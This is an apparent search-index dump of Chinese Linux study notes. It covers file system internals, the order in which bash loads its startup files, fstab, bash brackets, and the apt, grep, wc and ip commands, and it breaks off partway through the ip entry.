文件系统就是操作系统中负责管理持久数据的子系统（持久化的将文件保存在硬盘上） 文件系统的基本数据单位是文件，目的是对磁盘上的文件进行管理 Linux，一切皆文件 Linux数据系统会为每个文件分配两个数据结构： 索引节点 (index node)和 目录项 (directory entry)，记录文件元信息和目录层次结构 索引节点 记录文件的元信息，如访问权限、大小、数据在磁盘的位置等等，储存在硬盘中 目录项 记录文件的名字、索引节点指针以及与其他目录项的层级关联关系。\n多个目录项关联起来，形成目录结构，与索引节点不同的是，目录项是由内核维护的一个数据结构，不存放于磁盘而是存在于内存 虚拟文件系统 文件系统的种类繁多，而操作系统希望对用户提供一个统一的接口，于是在用户层和文件系统层中引入了中间层，被称为虚拟文件系统 文件存储方式 连续空间存放： 连续的物理空间存储，易产生磁盘碎片 非连续空间存放 链表方式 隐式链表 实现的方式是文件头要包含磁盘块\"第一块\"和\"最后一块\"的位置，\n并且每个数据块留出一个指针空间，用来存放下一个数据块的位置。\n稳定性较差，一般发生错误导致指针损坏，会导致文件数据的丢失 显式链接 相当于在隐式的基础上取出所有的指针，放在内存的一个表上。\n链接文件各个数据块的指针，显式的存放在内存的一张表中，每个表项中存放链接指针，\n指向下一个数据块号。（表在内存，不适用与大磁盘） 链表的方式解决了连续分配的磁盘碎片和文件动态拓展问题，但是不能有效支持直接访问（FAT除外） 索引方式 索引解决了直接访问的问题。索引的现实是为每个文件创建一个索引数据块，里面存放的是指向文件数据块的指针列表。 索引的缺陷在于储存索引带来的额外开销 链式索引块 链表加索引的组合，实现方式是在索引数据块留出一个存放下一个索引数据块的指针。会出现某个索引数据块坏了导致文件受损。 多级索引块 通过一个索引块来存储多个索引数据块（俄罗斯套娃）。 早期 Unix存储 结合了以上的优点: 一个索引文件头（Inode）——————>10个数据块\n\n                  ——————>一级索引数据块——————>n个数据块\n\n                  ——————>二级索引数据块——————>n&#94;2个数据块\n\n                  ——————>三级索引数据块——————>n&#94;3个数据块 如果存放文件的数据块超过10块，采用直接查找的方式 超过10块，采用一级间接索引； 以上不够存放大文件，采用二级索引； 以上不够存放大文件，采用三级索引。 文件头包含13个指针，10个指向数据块，各1个一、二、三级索引的指针指向。 此方案用在了Linux Ext2/3文件系统里，解决了大文件的存储，但是对于大文件的访问需要大量的查询，访问效率低。 空闲空间管理 空闲表法 为所有的空闲空间建立一张表，包含空闲区的第一个块号和该空闲区的个数（连续分配） 空闲链表法 所有的空闲块以链表的方式来指向，特点是简单 缺点：指针会消耗一定存储空间，不能随机访问，效率低 空闲表和空闲链表都不适合大文件系统，否则会使表太大 位图法 利用二进制的一位来表示磁盘中一个盘块的使用情况 （Linux就采用此法管理空闲空间，还用来进行Inode空闲块的管理，因为Inode也是存在磁盘的） 文件系统的结构 数据库的位图是放在磁盘块里的，假设是放在一个块里，一个块4 k，\n每位表示一个数据块，共可以表示4 * 1024 * 8 = 2&#94;15个空闲块，\n由于一个数据块是4 k大小，那么最大可以表示 2&#94;15 * 4 * 1024 = 2&#94;27 个byte，也就是128 M。 也就是说按照上面的结构，采用 [一个块的位图 + 一系列的块] ，\n外加 [一个iNode的位图 + 一系列iNode的结构] 所表示的内容最大128 M太少了。 上述结构在Linux中被称为一个**块组**， 那么有n多的块组，就能表示n大的文件 Linux Ext2 整个文件系统由1 k的引导块加n个块组组成，块组包含 超级块1块 块组描述符多块 数据位图一块 iNode位图一块 iNode列表多块 数据块多块 其中， 超级块 与 块组描述符 是全局信息，非常重要 Ext2的后续系统中采用了稀疏技术（并不是每一块都有 超级块 与 块组描述符 ）。 目录的存储 目录文件的块里保存着目录里面一项项文件信息。 Linux的Ext文件系统就是采用了哈希表，来保存目录的内容。 目录查询通过在磁盘反复搜索所完成，i/o开销比较大，所以可以先缓存在内存里面。 软链接和硬链接 硬链接 多个目录项的索引节点指向一个文件系统，而 iNode 是不可跨文件系统的，\n每个文件系统都有自己的iNode数据结构和列表，所以硬链接是不可跨文件系统的。\n只有删除文件的所有硬链接以及源文件时，系统才会彻底删除该文件。 软链接 相当于重新创建一个文件，这个文件有独立的inode，但是文件内容是另外一个文件的路径，\n所以访问软链接的时候，实际相当于访问到另一个文件，所以软链接是可跨越文件系统的。 总结一下： 硬链接： 与普通文件没什么不同， inode 都指向同一个文件在硬盘中的区块 软链接： 保存了其代表的文件的绝对路径，是另外一种文件，在硬盘上有独立的区块，访问时替换自身路径。 文件i/o 分类： 缓冲与非缓冲i/o 是否通过标准库的缓存访问文件（缓冲：标准库内部的缓冲）。 直接与非直接i/o 是否利用操作系统的缓存，内核空间缓存，也叫页缓存 直接i/o：不会发生内核缓存和用户数据之间的复制，而是直接经过文件系统访问磁盘。 非直接i/o：读操作时，数据从内核缓存拷贝给用户程序，写操作时，数据从用户程序拷贝给内核缓存，再由内核决定什么时候写到磁盘 阻塞与非阻塞i/o VS 同步与异步i/o 阻塞等待的是\"内核数据准备好\"和\"数据从内核态拷贝到用户态\"这两个过程。 非阻塞，read在为准备好时立即返回，后又轮询。以为太傻了，改进了有了多路复用（都是同步的）。 异步不需等待，可以直接去做其他的，系统会自己完成调用写到程序空间","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-File-system-detailed-explanation.html","loc":"/yq-docs-operating-system-linux-Conceptual-File-system-detailed-explanation.html"},{"title":"linux系统环境加载顺序","text":"登陆shell(login shell) 取得 bash 时需要完整的登陆流程的，就称为 login shell.\n比如通过ssh方式连接，或者由tty1 ~ tty6 登陆，\n需要输入用户的账号与密码，此时取得的 bash 就称为login shell 当我们在终端上运行 bash 、 zsh 等命令登录系统时,启动的shell就是登录shell。\n它的环境变量加载顺序是: /etc/profile 此文件为系统的每个用户设置环境信息，当用户第一次登录时，该文件被执行。 并从/etc/profile.d目录的配置文件中搜集shell的设置。 /etc/bashrc 为每一个运行bash shell的用户执行此文件。当bash shell被打开时，该文件被读取。 ~/.bash_profile 每个用户都可使用该文件输入专用于自己使用的shell信息，当用户登录时，该文件仅仅执行一次！默认情况下，他设置一些环境变量，执行用户的。bashrc文件。 ~/.bash_login ~/.profile ~/.bashrc 该文件包含专用于你的bash shell的bash信息，当登录时以及每次打开新的shell时，该该文件被读取。 ~/.bash_logout 当每次退出系统（退出bash shell）时，执行该文件。\n另外，/etc/profile中设定的变量（全局）的可以作用于任何用户，而~/.bashrc等中设定的变量（局部）只 能继承/etc/profile中的变量，他们是\"父子\"关系。 ~/.bash_profile 是交互式、login 方式进入 bash 运行的\n~/.bashrc 是交互式 non-login 方式进入 bash 运行的通常二者设置大致相同，所以通常前者会调用后者。 非登陆shell(non-login shell) 取得 bash 接口的方法不需要重复登陆的举动.\n比如你以 X window 登陆 Linux 后， 再以 X 的图形化接口启动终端机，\n此时该终端接口无需输入账号与密码，则为non-login shell;\n又比如你在原本的 bash 环境下再次下达 bash 这个命令，\n同样的也没有输入账号密码， 那第二个 bash (子程序) 也是 non-login shell. 当我们在终端上运行 bash -c 'command' 或在GUI程序中启动shell时,启动的shell就是非登录shell。\n它的环境变量加载顺序是: /etc/bash.bashrc ~/.bashrc 注解 可以通过 echo $0 查看属于那种Shell 演示 演示环境: [root@system1 ~]# more /etc/redhat-release\nRed Hat Enterprise Linux Server release 7.0 (Maipo) 当前从ssh登陆到服务器: [root@system1 ~]# tty\n/dev/pts/1 输入 echo $0， 显示结果为 -bash ，即为登陆shell: [root@system1 ~]# echo $0\n-bash\n[root@system1 ~]# ps\n  PID TTY          TIME CMD\n77122 pts/1    00:00:00 bash\n77157 pts/1    00:00:00 ps 下面在X windows打开一个终端，如下，显示为/bin/bash，即非登陆shell: [root@system1 Desktop]# echo $0\n/bin/bash\n\n[root@system1 ~]# ps -ef|grep pts|grep bash\nroot      73245  73241  0 11:49 pts/0    00:00:00 /bin/bash\nroot      76511  73245  0 16:19 pts/0    00:00:00 bash\nroot      77122  77118  0 17:02 pts/1    00:00:00 -bash\nroot      77158  77118  0 17:03 pts/2    00:00:00 -bash\nroot      77210  73241  0 17:04 pts/3    00:00:00 /bin/bash\nroot      77283  77279  0 17:06 pts/4    00:00:00 -bash\nroot      77332  77122  0 17:06 pts/1    00:00:00 grep --color=auto bash 在上传的结果中73245，77210为非登陆shell，77122，77158，77283为登陆shell 交互式shell(interactive shell) 交互式模式就是在终端上执行，shell等待你的输入，并且立即执行你提交的命令。\n这种模式被称作交互式是因为shell与用户进行交互。\n这种模式也是大多数用户非常熟悉的：登录、执行一些命令、退出。当你退出后，shell也终止了。 无论是登录shell还是非登录shell,只要它 attach 到当前终端并接受用户的输入,\n那它就是一个交互式shell。\n交互式shell的环境变量加载顺序包括: 登录shell或非登录shell加载的所有文件 ~/.inputrc 非交互式shell(non-interactive shell) shell也可以运行在另外一种模式：非交互式模式，以shell script(非交互)方式执行。\n在这种模式 下，shell不与你进行交互，而是读取存放在文件中的命令,并且执行它们。\n当它读到文件的结尾EOF，shell也就终止了。 如果一个shell在后台执行,不接受任何用户输入,那么它就是非交互式shell。非交互式shell仅加载: 登录shell加载的文件(/etc/profile和~/.bash_profile) 非登录shell加载的文件(/etc/bash.bashrc) 如下，执行 echo $-，查看其中的\"i\"选项（表示interactive shell）: [root@system1 ~]# echo $-\nhimBH 如下，为非交互shell: [root@system1 ~]# echo 'echo $-' | bash\nhB 环境变量的调用顺序 对于登陆shell，读取~/.bash_profile配置文件时，会做出读取顺序判读，如下: ~/.bash_profile —> ~/.bash_login  —> ~/.profile 但 bash 的 login shell 配置只会读取上面三个文件的其中一个， 而读取的顺序则是依照上面的顺序。\n也就是说，如果 ~/.bash_profile 存在，那么其他两个文件不论有无存在，都不会被读取。\n如果 ~/.bash_profile 不存在才会去读取 ~/.bash_login，而前两者都不存在才会读取 ~/.profile 的意思。 在shell登出时会读取 ~/.bash_logout 属于非登录shell：不需要输入密码的登录及远程 SSH 连接——>  ~/.bashrc（用户文件U2）——>/etc/bashrc（全局文件G2） 如果用户的Shell 不是登录时启动的（比如手动敲下 bash 时启动或者其他不需要输入密码的登录及远程 SSH 连接情况）\n那么这种非登录 Shell 只会加载 ~/.bashrc`（用户环境变量文件），并会去找 `/etc/bashrc`（全局环境变量文件），\n因此如果希望在非登录 Shell 下也可读到设置的环境变量等内容，\n就需要将变量设定写入 `~/.bashrc 或者 /etc/bashrc ，而不是 ~/.bash_profile 或 /etc/profile 环境变量相关文件 /etc/profile：系统配置文件，用户登录时读取一次 /etc/profile.d: 系统配置文件夹, 一般下面的 .sh 文件会在/etc/profile加载之后进行加载 /etc/bash.bashrc：（Ubuntu）系统配置文件，用户登录时读取一次，每次打开一个新终端会话时读取一次。 /etc/bashrc： （Centos）系统配置文件，用户登录时读取一次，每次打开一个新终端会话时读取一次。 ~/.profile（~/.bash_profile、~/.bash_login）：用户配置文件，用户登录时读取一次 ~/.bashrc：用户配置文件，用户登录时读取一次，每次打开一个新终端会话时读取一次 对于 ~/.bash_profile、~/.bash_login、~/.profile，如果终端绑定的是 bash，\n则按照顺序进行读取（如果存在，就不继续读取） 系统配置文件作用于全局，而用户配置文件仅针对当前登录的用户 先读取系统配置文件，再读取用户配置文件，用户配置文件的变量和表达式等都继承自系统配置文件","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-Linux-system-environment-loading-order.html","loc":"/yq-docs-operating-system-linux-Conceptual-Linux-system-environment-loading-order.html"},{"title":"特殊符号","text":"code: &     表示任务在后台执行，如要在后台运行\n&&    表示前一条命令执行成功时，才执行后一条命令\n|     表示管道，上一条命令的输出，作为下一条命令参数(输入)\n||    表示上一条命令执行失败后，才执行下一条命令\n>     符号是指：将正常信息重定向","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-Special-symbol.html","loc":"/yq-docs-operating-system-linux-Conceptual-Special-symbol.html"},{"title":"fstab","text":"概述 /etc/fstab是用来存放文件系统的静态信息的文件。 系统启动的时候，系统会自动从这个文件读取信息，并且会自动的将文件中指定的文件系统挂载到指定的目录。 查看: less /etc/fstab 字段定义: <file system>    <dir>  <type>  <options>   <dump>  <pass>\n\n<file system>：要挂载的分区或者存储设备\n\n<dir>：挂载的位置（路径）\n\n<type>：挂载设备或者分区的文件系统类型，\n\n     如：ext2,ext3,ext4,ntfs,swap,auto等\n\n<options>：挂载时使用的参数，注意有些mount参数是特定文件系统才有的\n\n<dump>：dump工具通过它决定何时备份。\n\n     允许写入数字0,1\n\n     0表示忽略；1，表示被封\n\n<pass>：决定fsck需要检查文件系统的检查顺序\n\n     允许写入0,1,2\n\n     根目录应当获取最高的优先权1，其他所有需要被检查的设备设置为2，0表示设备不会fsck被检查 文件系统标识 三种方法： 内核名称 uuid label 其中使用uuid与label好处在于与磁盘顺序无关","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-fstab.html","loc":"/yq-docs-operating-system-linux-Conceptual-fstab.html"},{"title":"bash括号","text":"单小括号() 命令组。\n括号中的命令将会新开一个子shell顺序执行，所以括号中的变量不能够被脚本余下的部分使用。\n括号中多个命令之间用分号隔开，最后一个命令可以没有分号，各命令和括 号之间不必有空格。 命令替换。\n等同于 cmd ，shell扫描一遍命令行，发现了 $(cmd) 结构，便将$(cmd)中的cmd执行一次，\n得到其标准输出，再将此输出放到原来命令。有些shell不支持，如tcsh。 初始化数组。\n如: array=(a b c d) 双小括号(()) 整数扩展。\n这种扩展计算是整数型的计算，不支持浮点型。\n((exp))结构扩展并计算一个算术表达式的值，如果表达式的结果为0，\n那么返回的退出状态码为1，或者是\"假\"，\n而一个非零值的表达式所返回的退出状态码将为0，或者是\"true\"。 若是逻辑判断，表达式exp为真则为1,假则为0。 只要括号中的运算符、表达式符合C语言运算规则，都可用在$((exp))中，甚至是三目运算符。\n作不同进位(如二进制、八进制、十六进制)运算时，输出结果全都自动转化成了十进制。\n如: echo $((16#5f)) 结果为95 (16进位转十进制) 单纯用 (( )) 也可重定义变量值，比如 a=5; ((a++)) 可将 $a 重定义为6。 常用于算术运算比较，双括号中的变量可以不使用$符号前缀。\n括号内支持多个表达式用逗号分开。\n只要括号中的表达式符合C语言运算规则, 比如可以直接使用: for((i=0;i<5;i++)) 如果不使用双括号, 则为: for i in `seq 0 4` 或者: for i in {0..4} 再如可以直接使用: if (($i<5)) 如果不使用双括号, 则为: if [ $i -lt 5 ] [] 主要用于字符串比较和整数比较 bash 的内部命令，[和test是等同的。\n如果我们不用绝对路径指明，通常我们用的都是bash自带的命令。 if/test结构中的左中括号是调用test的命令标识，右中括号是关闭条件判断的。\n这个命令把它的参数作为比较表达式或者作为文件测试，\n并且根据比较的结果来返回一个退出状态码。 if/test结构中并不是必须右中括号，但是新版的Bash中要求必须这样。 test和[]中可用的比较运算符只有==和!=，两者都是用于字符串比较的，\n不可用于整数比较，整数比较只能使用-eq，-gt这种形式。\n无论是字符串比较还是整数比较都不支持大于号小于号。\n如果实在想用，对于字符串比较可以使用转义形式，\n如果比较\"ab\"和\"bc\"：[ ab < bc ]，结果为真，也就是返回状态为0。\n[ ]中的逻辑与和逻辑或使用-a 和-o 表示。 字符串比较时可用 == 和 != ，而整数比较时要使用: -eq        #等于 equal\n-ne        #不等于 not equal 有些说是 inequality\n-gt        #大于 greater than\n-lt        #小于 less than\n-ge        #大于等于 greater than or equal\n-le        #小于等于 less than or equal 字符范围。用作正则表达式的一部分，描述一个匹配的字符范围。作为test用途的中括号内不能使用正则。 在一个array 结构的上下文中，中括号用来引用数组中每个元素的编号。 双中括号[[]] [[是 bash 程序语言的关键字。\n并不是一个命令，[[ ]] 结构比[ ]结构更加通用。\n在[[和]]之间所有的字符都不会发生文件名扩展或者单词分割，但是会发生参数扩展和命令替换。 支持字符串的模式匹配，使用=~操作符时甚至支持shell的正则表达式。\n字符串比较时可以把右边的作为一个模式，而不仅仅是一个字符串，\n比如[[ hello == hell? ]]，结果为真。[[ ]] 中匹配字符串或通配符，不需要引号。 使用[[ ... ]]条件判断结构，而不是[ ... ]，能够防止脚本中的许多逻辑错误。\n比如，&&、||、<和> 操作符能够正常存在于[[ ]]条件判断结构中，\n但是如果出现在[ ]结构中的话，会报错。 比如可以直接使用: if [[ $a != 1 && $a != 2 ]] 如果不适用双括号, 则为: if [ $a -ne 1] && [ $a != 2 ]\n# 或者\nif [ $a -ne 1 -a $a != 2 ] bash把双中括号中的表达式看作一个单独的元素，并返回一个退出状态码。 符号$后的括号 （1）${a} 变量a的值, 在不引起歧义的情况下可以省略大括号。 （2）$(cmd) 命令替换，和 cmd 效果相同，结果为shell命令cmd的输，过某些Shell版本不支持$()形式的命令替换, 如tcsh。 （3）$((expression)) 和 exprexpression 效果相同, 计算数学表达式exp的数值, 其中exp只要符合C语言的运算规则即可, 甚至三目运算符和逻辑表达式都可以计算。 多条命令执行 （1）单小括号，(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后可以没有分号。 （2）单大括号，{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。 对{}和()而言, 括号中的重定向符只影响该条命令， 而括号外的重定向符影响到括号中的所有命令。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-shell-bracket.html","loc":"/yq-docs-operating-system-linux-Conceptual-shell-bracket.html"},{"title":"apt","text":"debian/ubuntu 的下的包管理器 语法: apt <command> [options] [packages] 支持的command show list install search depends 查看某个软件包的依赖信息 选项参数 -y 无需输入y手动确认是否安装 install install 命令用来安装或者升级包。\n每个包都有一个包名，而不是一个完全限定的文件名(例如，在 Debian 系统中，提供的参数是 apt-utils，而不是 apt-utils_1.6.1_amd64.deb)。\n被安装的包依赖的包也将被安装。配置文件 /etc/apt/sources.list 中包含了用于获取包的源(服务器)。install 命令还可以用来更新指定的包。 upgrade upgrade 命令用于从 /etc/apt/sources.list 中列出的源安装系统上当前安装的所有包的最新版本。\n在任何情况下，当前安装的软件包都不会被删除，尚未安装的软件包也不会被检索和安装。\n如果当前安装的包的新版本不能在不更改另一个包的安装状态的情况下升级，则将保留当前版本。\n必须提前执行 update 命令以便 apt-get 知道已安装的包是否有新版本可用。 注意 update 与 upgrade 的区别： update 是更新软件列表，upgrade 是更新软件。 dist-upgrade 除执行升级功能外，dist-upgrade 还智能地处理与新版本包的依赖关系的变化。\napt-get 有一个 \"智能\" 的冲突解决系统，如果有必要，它将尝试升级最重要的包，以牺牲不那么重要的包为代价。\n因此，distr -upgrade 命令可能会删除一些包。\n因此在更新系统中的包时，建议按顺序执行下面的命令: $ apt-get update\n$ apt-get upgrade -y\n$ apt-get dis-upgrade -y remove remove 与 install 类似，不同之处是删除包而不是安装包。注意，使用 remove 命令删除一个包会将其配置文件留在系统上。 purge purge 命令与 remove 命令类似，purge 命令在删除包的同时也删除了包的配置文件。 autoremove autoremove 命令用于删除自动安装的软件包，这些软件包当初是为了满足其他软件包对它的依赖关系而安装的，而现在已经不再需要了。 download download 命令把指定包的二进制文件下载到当前目录中。注意，是类似 *.deb 这样的包文件。 clean clean 命令清除在本地库中检索到的包。它从 /var/cache/apt/archives/ 和 /var/cache/apt/archives/partial/ 目录删除除锁文件之外的所有内容。 autoclean 与 clean 命令类似，autoclean 命令清除检索到的包文件的本地存储库。\n不同之处在于，它只删除不能再下载的软件包文件，而且这些文件在很大程度上是无用的。\n这允许长时间维护缓存，而不至于大小失控。 source source 命令下载包的源代码。默认会下载最新可用版本的源代码到当前目录中。 changelog changelog 命令尝试下载并显示包的更新日志。 相关 apt-cache apt-cache apt-get apt-get autoremove的坑 当安装/卸载软件时, apt会提示我们某些依赖包不需要了,\n让我们手动执行 apt autoremove 来清理它们. 但是, apt 对需要还是不需要的判断, 不一定是正确的. 那这个时候执行 apt autoremove 就是错误的移除一些依赖包.\n我在 Ubuntu 桌面系统就遇到过这个问题, autoremove 后,\n把桌面系统都给干掉了... 最后还是 apt install ubuntu-gnome-desktop 来重新安装桌面系统才回来的.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-APT.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-APT.html"},{"title":"cd","text":"目录的切换 返回最近一次的目录: cd -","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Chengdu.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Chengdu.html"},{"title":"eval","text":"重新运算求出参数的内容","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Eval.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Eval.html"},{"title":"wc","text":"利用wc指令我们可以计算文件的Byte数、字数、或是列数，若不指定文件名称、或是所给予的文件名为\"-\"，则wc指令会从标准输入设备读取数据。 语法: wc [-clw][--help][--version][文件...] 参数 -c , --bytes , --chars 只显示Bytes数。 -l , --lines 显示行数。 -w , --words 只显示字数。一个字被定义为由空白、跳格或换行字符分隔的字符串 -m 统计字符数。这个标志不能与 -c 标志一起使用。 -L 打印最长行的长度。 --help 在线帮助。 --version 显示版本信息。 注解 默认情况下, 显示 行数、单词数，以及字节数. 支持多个文件统计总数. 用例 计算当前文件夹下视频数(mp4文件个数): ls *.mp4 | wc -l","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Finish.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Finish.html"},{"title":"grep","text":"用于查找文件里符合条件的字符串。 grep 指令用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设 grep 指令会把含有范本样式的那一列显示出来。 若不指定任何文件名称，或是所给予的文件名为 -，则 grep 指令会从标准输入设备读取数据。 语法: grep [-abcEFGhHilLnqrsvVwxy][-A<显示行数>][-B<显示列数>][-C<显示列数>][-d<进行动作>][-e<范本样式>][-f<范本文件>][--help][范本样式][文件或目录...] 选项参数(常用) -E 在扩展正则模式下 -P 在Perl正则模式下 -V 将不匹配的过滤出来 -r 递归查找 -r , -R 递归查找 -q 安静模式，不在屏幕上输出 -i 忽略大小写 -n 增加行号 -o 只输出文件中匹配到的部分 -m <num> , --max-count= <num> 找到num行结果后停止查找，用来限制匹配行数 --color 红色输出 全部可参考: Linux grep 命令 获取文件内容所在行: cat file | grep -n 'xxx' | cut -d ':' -f 1\n\n# 或者\ngrep -n 'xxx' file | cut -d ':' -f 1 搜索data文件夹下的所有文件, 是否包含pack: grep -r \"pack\" data 全部选项 -a , --text 不要忽略二进制的数据。 -A <显示行数> , --after-context= <显示行数> 除了显示符合范本样式的那一列之外，并显示该行之后的内容。 -b , --byte-offset 在显示符合样式的那一行之前，标示出该行第一个字符的编号。 -B <显示行数> , --before-context= <显示行数> 除了显示符合样式的那一行之外，并显示该行之前的内容。 -c , --count 计算符合样式的列数。 -C <显示行数> , --context= <显示行数> 或者直接 -<显示行数> . 除了显示符合样式的那一行之外，并显示该行之前后的内容。 -d <动作> , --directories= <动作> 当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作。 -e <范本样式> , --regexp= <范本样式> 指定字符串做为查找文件内容的样式。 -E , --extended-regexp 将样式为延伸的正则表达式来使用。 -f <规则文件> , --file= <规则文件> 指定规则文件，其内容含有一个或多个规则样式，让grep查找符合规则条件的文件内容，格式为每行一个规则样式。 -F , --fixed-regexp 将样式视为固定字符串的列表。 -G , --basic-regexp 将样式视为普通的表示法来使用。 -h , --no-filename 在显示符合样式的那一行之前，不标示该行所属的文件名称。 -H , --with-filename 在显示符合样式的那一行之前，表示该行所属的文件名称。 -i , --ignore-case 忽略字符大小写的差别。 -l , --file-with-matches 列出文件内容符合指定的样式的文件名称。 -L , --files-without-match 列出文件内容不符合指定的样式的文件名称。 -n , --line-number 在显示符合样式的那一行之前，标示出该行的列数编号。 -o , --only-matching 只显示匹配PATTERN 部分。 -q , --quiet , --silent 不显示任何信息。 -r , --recursive 此参数的效果和指定\"-d recurse\"参数相同。 -s , --no-messages 不显示错误信息。 -v , --invert-match 显示不包含匹配文本的所有行。 -V , --version 显示版本信息。 -w , --word-regexp 只显示全字符合的列。 -x , --line-regexp 只显示全列符合的列。 -y 此参数的效果和指定\"-i\"参数相同。 grep去除本身 有个小技巧, 与ps结合的时候, grep的结果往往会包含grep当前查询本身,\n那么如何去掉?\n死办法: ps | grep test | grep -v grep 优雅点: ps | grep \"tes[t]\" 稍微解释一下, [t] 表示一个正则, 只能选择字符 z,\n与直接查询效果是一致的, 能排出掉grep本身, 是因为这时候grep进程大致长这: ps | grep \"tes[t]\" 不会解析正则, 所以可以直接排除掉","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-GREP.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-GREP.html"},{"title":"history","text":"命令历史","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-History.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-History.html"},{"title":"ip","text":"若无则安装: apt install iproute2 查看网络状态 语法: ip [option] [动作] [指令] 选项与参数 支出的选项/命令: -s    : s link  : link address, a    : address route, r      : route s 说明: ip -s   # 显示该装置的统计数据\n\n# 后面可跟参数\n    link            # 关于设备的相关设定，包括MTU Mac地址等\n    addr/address    # 关于额外的ip协议。例如多ip的达成\n    route           # 与路由相关的设定 link 说明: ip link\n\n# 后面可跟参数\n    show        # 仅显示出与这个装置相关的内容\n    set         # 可以开始设定项目，device指的是eth0等界面代号\n                # set支持参数\n                up|down     # 启动或者关闭某个接口\n                address     # 如果这个装置可以修改mac地址，用这个修改\n                name        # 命名\n                mtu         # 最大传输单元 address 查看网卡信息 说明: # 或者 ip a\nip address\n\n# 后面可跟参数\nshow        # 显示接口ip信息. 默认就是此参数\nadd|del     # 添加/删除相关设定\n            # 支持参数\n            ip      # 主要就是网域的设定\n            dev     # 这个ip参数设定的接口 如eth0，\n                # 包含的参数如下\n                broadcast    # 设定广播地址，如果设定值是+，表示自动设置\n                label        # 装置的别名 例如 eth0:0\n                scope        # 这个界面的领域，\n                    # 有以下几类\n                    global          # 允许来自所有来源的联机\n                    site            # 仅支持ipv6    仅允许本主机的联机\n                    link            # 仅允许本装置自我联机\n                    host            # 仅允许主机内部联机 输出参数详解： lo 全称loopback，是回环地址，经常被分配到127.0.0.1地址上，用于本机通信，经过内核处理后直接返回，不会在任何网络中出现。 eth0 网卡名，如果有多块网卡，会有多个eth 或其它名称。 link/ether 这个是MAC地址，唯一的，一块网卡一个MAC。 inet 网卡上绑定的IP地址，通常所说的IPV4，一块网卡可以绑定多个IP地址。在绑定IP地址时注意：windows主机会提示IP地址冲突，而linux主机无任何提示，在添加新的IP地址时务必检测一下新地址是否和原有地址冲突，避免造成访问不可用。常用检测命令：ping或arping IP； inet6 IPV6地址，暂时没有，预留。 网络设备状态标识: <BROADCAST,MULTICAST,UP,LOWER_UP> UP 网卡处于启动状态。 BROADCAST 网卡有广播地址，可以发生广播包。 MULTICAST 网卡可以发生多播包。 LOWER_UP L1是启动的，即网线是插着的。 <BROADCAST,MULTICAST,UP,LOWER_UP> 这个配置串告诉我们： BROADCAST   该接口支持广播\nMULTICAST   该接口支持多播\nUP          网络接口已启用\nLOWER_UP    网络电缆已插入，设备已连接至网络 列出的其他值也告诉了我们很多关于接口的知识，\n但我们需要知道 brd 和 qlen 这些词代表什么意思。\n所以，这里显示的是上面展示的 ip 信息的其余部分的翻译: mtu 1500                                    最大传输单位（数据包大小）为1,500字节\nqdisc pfifo_fast                            用于数据包排队\nstate UP                                    网络接口已启用\ngroup default                               接口组\nqlen 1000                                   传输队列长度\nlink/ether 00:1e:4f:c8:43:fc                接口的 MAC（硬件）地址\nbrd ff:ff:ff:ff:ff:ff                       广播地址\ninet 192.168.0.24/24                        IPv4 地址\nbrd 192.168.0.255                           广播地址\nscope global                                全局有效\ndynamic enp0s25                             地址是动态分配的\nvalid_lft 80866sec                          IPv4 地址的有效使用期限\npreferred_lft 80866sec                      IPv4 地址的首选生存期\ninet6 fe80::2c8e:1de0:a862:14fd/64          IPv6 地址\nscope link                                  仅在此设备上有效\nvalid_lft forever                           IPv6 地址的有效使用期限\npreferred_lft forever                       IPv6 地址的首选生存期 route 查看路由信息 说明: # 或者 ip r\nip route\n\n# 后面可跟参数\n\nshow            # 单纯显示路由表，也可以使用list. 默认就是此参数\nadd|del\n    # 支持参数\n    IP|网域     # 可以使用192.168.170.0/24这样的网域或者单纯的ip\n    via        # 从那个gateway出去，不一定需要\n    dev        # 由那个装置连接出去，需要\n    mtu        # 额外设定MTU的数值 输出详解 lo：全称loopback，是回环地址，经常被分配到127.0.0.1地址上，用于本机通信，经过内核处理后直接返回，不会在任何网络中出现。 eth0：网卡名，如果有多块网卡，会有多个eth 或其它名称。 link/ether：这个是MAC地址，唯一的，一块网卡一个MAC。 inet：网卡上绑定的IP地址，通常所说的IPV4，一块网卡可以绑定多个IP地址。在绑定IP地址时注意：windows主机会提示IP地址冲突，而linux主机无任何提示，在添加新的IP地址时务必检测一下新地址是否和原有地址冲突，避免造成访问不可用。常用检测命令：ping或arping IP； inet6：IPV6地址，暂时没有，预留。 网络设备状态标识：<BROADCAST,MULTICAST,UP,LOWER_UP> UP：网卡处于启动状态。 BROADCAST：网卡有广播地址，可以发生广播包。 MULTICAST：网卡可以发生多播包。 LOWER_UP：L1是启动的，即网线是插着的。 <BROADCAST,MULTICAST,UP,LOWER_UP 这个配置串告诉我们: BROADCAST   该接口支持广播\nMULTICAST   该接口支持多播\nUP          网络接口已启用\nLOWER_UP    网络电缆已插入，设备已连接至网络 列出的其他值也告诉了我们很多关于接口的知识，但我们需要知道 brd 和 qlen 这些词代表什么意思。 所以，这里显示的是上面展示的 ip 信息的其余部分的翻译: mtu 1500                                    最大传输单位（数据包大小）为1,500字节\nqdisc pfifo_fast                            用于数据包排队\nstate UP                                    网络接口已启用\ngroup default                               接口组\nqlen 1000                                   传输队列长度\nlink/ether 